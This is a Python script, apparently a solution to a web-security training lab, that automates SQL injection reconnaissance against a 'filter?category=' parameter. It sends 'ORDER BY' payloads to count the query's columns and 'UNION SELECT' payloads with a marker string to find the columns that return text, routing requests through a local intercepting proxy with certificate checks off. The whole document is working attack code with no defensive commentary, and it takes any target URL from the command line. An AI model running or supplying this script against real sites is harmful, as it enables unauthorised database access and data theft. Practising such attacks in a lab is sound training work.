import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def exploit_sqli_col(url):
    path = "filter?category="
    for i in range(1,50):
        payload = "'+order+by+%s--" %i
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def finding_col_contain_text(url, num):
    path = "filter?category="
    string = "'4tYPbt'"
    sum_col = 0
    for i in range(1, num +1):
        payload_list = ['NULL'] * num
        payload_list[i - 1] = string # replace 
        sql_payload = "'UNION SELECT " + ','.join(payload_list) +"--"
        r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
        if string.strip('\'') in r.text:
            print("[*] The payload is " + sql_payload)
            sum_col = sum_col + 1
    if sum_col > 0:   
        return sum_col
    return False


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    num = exploit_sqli_col(url)
    print("Exploiting column of SQL....")
    if num:
        print("The columns of SQL is " + str(num)+".")
        print("Figuring out the column contain text...")
        num_text = finding_col_contain_text(url,num)
        if num_text:
            print("There are %s columns contain text." % num_text)
        else:
            print("Cannot detect the column contain text!")
    else:
        print("The SQL injection attack is unseccessful!")